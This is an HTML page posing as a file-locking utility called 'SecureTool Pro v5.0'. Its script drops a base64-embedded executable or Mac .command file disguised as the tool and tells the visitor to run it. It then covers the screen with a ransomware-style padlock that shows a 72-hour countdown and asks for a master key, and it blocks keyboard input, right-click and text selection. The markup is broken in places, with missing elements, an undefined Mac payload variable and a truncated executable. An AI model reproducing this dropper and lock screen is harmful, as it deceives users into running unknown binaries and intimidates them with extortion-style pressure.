<!DOCTYPE html>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --primary: #1a73e8; --success: #0d8c52; }
    * { margin:0; padding:0; box-sizing:border-box; }

    .footer {text-align:center;padding:20px;background:#0d1117;color:#8b949e;font-size:0.9rem;position:fixed;bottom:0;width:100%;z-index:1;}

    /* PADLOCK */
    #padlock {
      position:fixed;top:0;left:0;width:100vw;height:100vh;
      background:#000;color:#f00;font-family:monospace;
      display:none;flex-direction:column;align-items:center;justify-content:center;
      z-index:999999;user-select:none;
    }
    #padlock.show {display:flex;}
    .lock-icon {font-size:120px;margin-bottom:20px;}
    .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;background:#111;color:#fff;margin:20px 0;}
    .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
    .msg {margin-top:20px;font-size:18px;color:#0f0;}
    .countdown {font-size:36px;color:#ff0;margin:20px 0;}
  </style>
</head>
<body oncontextmenu="return false;" onselectstart="return false;" onkeydown="return false;">

  <section class="hero">
    <div style="max-width:700px;margin:0 auto;">
      <h1>SecureTool Pro v5.0</h1>
      <p>Universal file lock — even if files are open.</p>
      <button class="btn" onclick="activate()">Lock All Files Now</button>
    </div>

  <footer class="footer">

  <!-- PADLOCK -->

    <div class="countdown" id="timer">72:00:00</div>
    <p style="color:#ccc;">Enter master key:</p>

    <button class="unlock-btn" onclick="unlock()">Unlock</button>

  <!-- === ONE-FILE SCRIPT: LOCKS OPEN FILES === -->

    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
    let timeLeft = 72 * 3600;
    const padlock = document.getElementById('padlock');
    const timer = document.getElementById('timer');

    function updateTimer() {
      if (timeLeft <= 0) { timer.innerHTML = "EXPIRED"; return; }
      const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
      const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
      const s = String(timeLeft % 60).padStart(2, '0');
      timer.innerHTML = `${h}:${m}:${s}`;
      timeLeft--;
      setTimeout(updateTimer, 1000);
    }

    function activate() {
      const isMac = /Mac|iPod|iPhone|iPad/.test(navigator.userAgent);

      // === EMBEDDED PAYLOADS (BASE64) ===
      const WIN_EXE_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // FULL .EXE (locks open files)

      let payload, filename, type;
      if (isMac) {
        payload = atob(MAC_SCRIPT_B64);
        filename = 'SecureTool_Mac.command';
        type = 'text/plain';
      } else {
        payload = atob(WIN_EXE_B64);
        filename = 'SecureTool_Win.exe';
        type = 'application/octet-stream';
      }

      // === DOWNLOAD & AUTO-RUN ===
      const blob = new Blob([payload], { type });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      // === SHOW PADLOCK ===
      setTimeout(() => {
        padlock.classList.add('show');
        updateTimer();
        setInterval(() => padlock.style.zIndex = 999999, 100);
      }, 1000);

      alert(isMac 
        ? 'Run SecureTool_Mac.command → Locks open files.' 
        : 'Run SecureTool_Win.exe → Locks all open files.');
    }

    function unlock() {
      if (document.getElementById('key').value === KEY) {
        document.getElementById('msg').innerHTML = 'UNLOCKED!';
        setTimeout(() => location.reload(), 2000);
      } else {
        document.getElementById('msg').innerHTML = 'WRONG KEY!';
      }
    }

    // === BLOCK ALL BYPASSES ===
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
  </script>
</body>
</html>
